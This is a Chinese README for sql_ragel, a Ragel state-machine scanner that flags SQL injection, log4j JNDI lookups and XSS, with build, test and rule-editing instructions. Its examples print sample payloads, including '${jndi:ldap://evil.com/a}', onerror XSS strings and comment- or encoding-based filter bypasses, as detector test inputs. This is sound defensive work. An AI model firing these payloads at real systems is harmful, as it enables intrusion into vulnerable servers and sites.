# sql_ragel

用 [ragel](https://www.colm.net/open-source/ragel/) 写的一个小实验：把"判断一段输入是不是攻击 payload"写成状态机。

工作方式就两步：

1. **切词**：把输入切成一个个小片段。比如 `SELECT * FROM a` 切成 `SELECT`、`*`、`FROM`、`a`；`<img onerror=x>` 切成 `<img`、`onerror`、`x`。
2. **套规则**：拿这些片段去匹配规则，匹配上就说明可疑。

因为全部是状态机，跑得快，也不依赖正则引擎。

## 能干什么

编译完在 `build/ragel/` 下有这几个可执行文件，各自管一类攻击：

| 可执行文件 | 管什么 | 例子 |
| --- | --- | --- |
| `sqli_scan` | SQL 注入，24 条规则（恒真条件、UNION 注入、堆叠查询、危险函数等） | `1=1 OR 1=2` |
| `log4j_scan` | log4j 的 `${...}` 查找表达式 | `${jndi:ldap://evil.com/a}` |
| `html5_xss_scan` | XSS，6 条规则（黑标签、黑属性、黑 URL、style 注入、危险注释、危险 JS 调用） | `<img onerror=alert(1)>` |

## 跑起来

需要 ragel 和 gcc（Ubuntu/Debian）：

```bash
sudo apt install ragel gcc make
```

然后：

```bash
make -j        # 编译，产物在 build/ragel/
make test      # 跑测试
```

跑单条输入看看结果：

```bash
# 普通样本
./build/ragel/sqli_scan        '1=1 OR 1=2'
./build/ragel/log4j_scan       '${jndi:ldap://evil.com/a}'
./build/ragel/html5_xss_scan   '<img onerror=alert(1)>'

# 嵌套样本：括号 / ${} 套了好几层
./build/ragel/sqli_scan        '(SELECT * FROM (SELECT 1))'
./build/ragel/log4j_scan       '${lower:${jndi:ldap://x/y}}'
./build/ragel/html5_xss_scan   '<img onerror=window["constructor"]["constructor"]("alert(1)")()>'

# 绕过样本：注释、编码、拆词拼接
./build/ragel/sqli_scan        '1=1/**/OR/**/1=2'
./build/ragel/log4j_scan       '${jn${lower:d}i:ldap://x/a}'
./build/ragel/html5_xss_scan   '<img src=x onerror="al&#101;rt(1)">'
```

最后一组考验的是"能不能看懂内容"：SQL 里 `/**/` 是注释要跳过去、`&#101;` 解出来就是字母 `e`（`al` + `e` + `rt` 拼回 `alert`）、`${lower:d}` 归约成 `d`。只照着字符串硬比对的话，这三条都拦不住。

输出会先打印切出来的词，再打印命中的规则：`sqli_scan` 和 `html5_xss_scan` 的行首是 `!!`，`log4j_scan` 是 `[JNDI]` 这样的分类标签。`make test` 输出的是 `[PASS]` / `[FAIL]` 加最后一行总结。

不想用 make 也可以用 cmake：

```bash
cmake -S . -B build && cmake --build build -j
cmake --build build --target validate_ragel
```

## 目录

```
src/            底座：切词 + 语法骨架，各模块共用
  sql/          SQL 的切词、语法骨架
  html5/        HTML 的切词 + 字符实体解码（属性值归一化）
  js/           JS 的切词、语法骨架、危险调用检测
  log4j/        log4j 的切词
  util/         跨模块小工具（UTF-8 编码、大小写不敏感比较、\u 转义解析）
rules/          规则：真正判"是不是攻击"的地方
  html5_xss/    XSS 规则，corpus/xss.log 是攒的样本
  sqli/         SQL 注入规则
examples/       每个模块一个驱动（*_scan.c）+ 一套测试脚本（test_*.sh）
build/          编译产物，git 不跟踪
```

一句话：**`src/` 是工具，`rules/` 是规则。** 想调检测效果，基本只改 `rules/`。

## 改规则

- 规则写在 `rules/` 下对应模块的 `.rl` 文件里，改完 `make` 重新编译就生效。
- `build/ragel/gen/*.c` 是 ragel 从 `.rl` 生成的代码，是中间产物，别去看也别手改。
- 每个模块的测试在 `examples/test_*.sh`，是纯 bash 的断言脚本。加了规则记得顺手加两条用例。
- 规则文件会 include `src/` 下的共享片段，两者不在同一个目录，所以 ragel 生成时加了 `-I` 指向 `src/`。这部分写在 `Makefile` 和 `CMakeLists.txt` 里。

## 几个说明

- 驱动（`examples/*.c`）只 include 头文件、链接 `libragel_sql.a`，不直接碰生成的 `.c`。
- 括号嵌套、子查询这类需要递归的地方，用的是 ragel 的 `fcall` / `fret`，细节写在对应 `.rl` 的开头注释里。
- 只跑 `make` 不跑 `make test` 时，`.rl` 改了也会自动重新生成，不会用到旧产物。
